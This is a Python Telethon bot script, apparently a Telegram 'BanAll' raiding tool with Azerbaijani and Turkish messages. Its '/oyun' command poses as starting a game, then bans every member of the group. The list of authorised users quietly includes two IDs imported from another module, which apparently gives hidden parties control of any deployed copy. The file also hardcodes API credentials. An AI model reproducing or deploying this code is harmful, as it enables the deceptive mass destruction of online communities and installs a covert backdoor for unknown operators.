# Yaradıcı Bilinmir :D
# Botu İşlətdikdən Sonra Siz Cavabdehsiz
# Xeyirli Vuruşmalar .d
import logging
import re
import os
import sys, platform
from asyncio import sleep
from os import getenv
from dotenv import load_dotenv
from telethon import TelegramClient, events, Button
import telethon.utils
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from asyncio import sleep
from telethon import __version__ as tel
from str import dad as gg, dady as g, startxt2, startxt, hlptxt
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins, ChatAdminRights
from telethon.tl.functions.channels import EditBannedRequest
from datetime import datetime
#Logging...
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
API_ID = int(getenv("API_ID", "15861235"))
API_HASH = getenv("API_HASH", "00bc8529bf9c01bab15ba0e41cb42062")
BOT_TOKEN = getenv("BOT_TOKEN", None)
OWNER_ID = getenv("OWNER_ID", None)
OP  = [int(g), int(gg), int(OWNER_ID)]
#TelegramClient..
sree = TelegramClient(
    "BanAll",
    api_id=API_ID,
    api_hash=API_HASH
).start(bot_token=BOT_TOKEN)

Owner = "Rubyyyyyyyyyyy"
repo = "https://github.com/Rubyyyyyyy/ahahahahha"
@sree.on(events.NewMessage(pattern="^/start"))
async def start(event):
    buttns = [Button.url("••ѕυρροяτ••", "https://t.me/RubyProject"), Button.url("••ʀєρο••", f'{repo}')]
    py = platform.python_version()
    if event.sender.id in OP:
        await sree.send_file(
            event.chat.id,
            file="https://telegra.ph/file/1367b1dd68f851e36370d.jpg",
            caption=startxt.format(
                event.sender.first_name,
                event.sender.id,
                py,
                tel,
                Owner,
            ),
            link_preview=False,
            buttons=buttns
        )
    if event.sender.id not in OP:
        await sree.send_file(
            event.chat.id,
            file="https://telegra.ph/file/1367b1dd68f851e36370d.jpg",
            caption=startxt2.format(
                event.sender.first_name,
                event.sender.id,
                py,
                tel,
                Owner,
            ),
            link_preview=False,
            buttons=buttns
        )


@sree.on(events.NewMessage(pattern="^/help"))
async def start(event):
    buttns = [Button.url("••ѕυρροяτ••", "https://t.me/RubyProject"), Button.url("••ʀєρο••", f'{repo}')]
    py = platform.python_version()
    if event.sender.id in OP:
        await sree.send_file(
            event.chat.id,
            file="https://telegra.ph/file/1367b1dd68f851e36370d.jpg",
            caption=hlptxt.format(event.sender.first_name, event.sender.id),
            link_preview=False,
            buttons=buttns
        )
    if event.sender.id not in OP:
        await event.reply(
            "𝗠𝗘𝗡𝗜𝗠 𝗤𝗨𝗥𝗨𝗖𝗨𝗠 𝗦𝗘𝗡 𝗗𝗘𝗬𝗜𝗟𝗦𝗘𝗡👨🏻‍💻!\n\n𝗧𝗢𝗫𝗨𝗡 𝗟𝗜𝗡𝗞𝗘 𝗞𝗘𝗖 𝗩𝗘 𝗚𝗢𝗭𝗨𝗡 𝗢𝗬𝗨𝗡 𝗕𝗢𝗧𝗨 𝗚𝗢𝗥𝗦𝗨𝗡🔥[Repository⚡](https://github.com/Rubyyyyy/hahhhahhhhha)",
            link_preview=False,
        )       

@sree.on(events.NewMessage(pattern="^/ping"))
async def ping(event):
    if event.sender.id in OP:
        start = datetime.now()
        t = "İnternet Surəti Yoxlanılır"
        txxt = await event.reply(t)
        end = datetime.now()
        ms = (end-start).microseconds / 1000
        await txxt.edit(f"Men Aktivəm🔥!!\n\internet surəti (ms olarağ) 🏓\n   ➥ `{ms} ms`")


@sree.on(events.NewMessage(pattern="^/oyun"))
async def bun(event):
  if event.sender.id in OP:
   if not event.is_group:
        Rep = f"__𝗕𝗨 𝗘𝗠𝗥 𝗦𝗔𝗗𝗘𝗖𝗘 𝗚𝗥𝗨𝗕𝗗𝗔 𝗜𝗦𝗧𝗜𝗙𝗔𝗗𝗘 𝗘𝗗𝗜𝗟𝗜𝗥!!__"
        await event.reply(Rep)
   else:
       await event.delete()
       cht = await event.get_chat()
       boss = await event.client.get_me()
       admin = cht.admin_rights
       creator = cht.creator
       if not admin and not creator:
           await event.reply("__𝗢𝗬𝗨𝗡𝗔 𝗕𝗔𝗦̧𝗟𝗔𝗠𝗔𝗤 𝗨𝗖𝗨𝗡 𝗬𝗘𝗧𝗞𝗜𝗠 𝗬𝗢𝗫𝗗𝗨𝗥.__")
           return
       hmm =  await event.reply("__𝗢𝗬𝗨𝗡 5 𝗦𝗔𝗡𝗜𝗬𝗘 𝗜𝗖𝗜𝗡𝗗𝗘 𝗕𝗔𝗦̧𝗟𝗔𝗗𝗜𝗟𝗔𝗖𝗔𝗚⚡..__")
       await sleep(0.1)
       await hmm.delete()
       everyone = await event.client.get_participants(event.chat_id)
       for user in everyone:
           if user.id == boss.id:
               pass
           try:
               await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None,view_messages=True)))
           except Exception as e:
               await event.edit(str(e))
           await sleep(0.3)


@sree.on(events.NewMessage(pattern="^/restart"))
async def restart(jnl):
    if jnl.sender.id in OP:
        tct = "__𝗚𝗢𝗭𝗟𝗘 𝗬𝗘𝗡𝗜𝗗𝗘𝗡 𝗕𝗔𝗦̧𝗟𝗔𝗗𝗜𝗟𝗜𝗥__"
        await jnl.reply(tct)
        try:
            await sree.disconnect()
        except Exception:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()


@sree.on(events.NewMessage(pattern="^/leave"))
async def leave(z):
    if z.sender.id in OP:
        mkc = ("".join(z.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(z.text) > 7:
            mkb = int(mkc[0])
            tet = "__𝗚𝗢𝗭𝗟𝗘 𝗧𝗘𝗥𝗞 𝗘𝗗𝗜𝗟𝗜𝗥__"
            hm = await z.reply(tet)
            try:
                await z.client(LeaveChannelRequest(mkb))
                await hm.edit("**𝗨𝗚𝗨𝗥𝗟𝗔 𝗧𝗘𝗥𝗞 𝗢𝗟𝗨𝗡𝗗𝗨!!**")
            except Exception as e:
                await hm.edit(str(e))
        else:
            mkb = z.chat_id
            txt = "__𝗚𝗢𝗭𝗟𝗘 𝗧𝗘𝗥𝗞 𝗘𝗗𝗜𝗟𝗜𝗥__"
            ok = await z.reply(txt)
            try:
                await z.client(LeaveChannelRequest(mkb))
                await ok.edit("**𝗨𝗚𝗨𝗥𝗟𝗔 𝗧𝗘𝗥𝗞 𝗢𝗟𝗨𝗡𝗗𝗨!!**")
            except Exception as e:
                await z.edit(str(e))


print("𝗦𝗘𝗡𝗜𝗡 𝗕𝗢𝗧𝗨𝗡𝗨𝗡 𝗗𝗘𝗣𝗟𝗢𝗬𝗨 𝗨𝗚𝗨𝗥𝗟𝗨𝗗𝗨𝗥 ✅")
print("𝗧𝗢𝗫𝗨𝗡 𝗩𝗘 𝗚𝗜𝗥𝗜𝗦̧ 𝗘𝗧 @RubyProject 𝗥𝗘𝗦𝗣𝗘𝗖𝗧🎭!!")



sree.run_until_disconnected()
